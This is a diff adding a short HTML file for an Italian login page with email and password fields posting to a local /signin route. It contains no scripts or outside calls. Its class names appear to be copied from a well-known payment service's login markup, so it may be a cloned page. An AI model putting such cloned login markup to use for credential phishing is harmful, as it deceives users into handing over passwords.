@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="login.css" />
+    <title>Accedi al tuo profilo</title>   
+</head>
+    
+<body>
+                <header>
+                    <p class="logoEvent"><img src="Images/logo.png" height="100px" width="300px"></p>
+                </header>
+                <form action="/signin" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
+           
+                    <div id="passwordSection" class="clearfix">
+                            <div class="fieldEmail">
+                                <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" aria-required="true" value="" autocomplete="off" placeholder="Indirizzo email o user name">
+                            </div>
+                            <div class="fieldPassword">
+                                <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" aria-required="true" value="" placeholder="Password">
+                            </div>
+                    </div>
+                    <div class="accesso">
+                        <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Accedi</button>
+                    </div>
+                    <div class="problemi">
+                        <a href="" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Problemi di accesso?</a>
+                    </div>
+                </form>
+                <div class="registration">
+                        <a href="" id="createAccount">Registrati gratis</a>
+                </div>
+    
+        <footer class="footer" role="contentinfo">
+                <p class="footerCopyright">Nessun Copyright registrato. Tutti i diritti non sono riservati.</p>
+        </footer>
+      
+    
+    
+    
+    
+    
+    
+    
+    
+</body>
+</html>
